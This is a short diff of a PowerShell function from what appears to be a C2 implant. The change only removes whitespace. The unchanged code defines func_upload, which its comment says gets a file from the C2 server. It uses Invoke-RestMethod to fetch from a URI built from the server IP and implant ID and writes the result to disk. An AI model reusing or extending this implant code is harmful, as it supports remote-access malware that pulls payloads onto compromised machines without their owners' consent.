@@ -1,5 +1,5 @@
 # upload - gets a file from the C2 server and saves to disk
-function func_upload 
+function func_upload
 {
     param([string] $file_path) # the uri to get from, and the place to save to
 
@@ -9,6 +9,6 @@ function func_upload
     {
         $file_path = "upload"
     }
-    
+
     Invoke-RestMethod -Uri "$protocol//$ip/$upload_uri/$implant_id" -OutFile $file_path
 }
